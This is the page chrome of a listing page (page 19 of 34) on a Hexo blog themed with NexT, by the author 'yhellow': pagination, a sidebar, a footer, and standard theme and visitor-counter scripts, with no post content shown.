    <a class="extend prev" rel="prev" href="/page/18/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/20/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">333</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">171</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">75:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
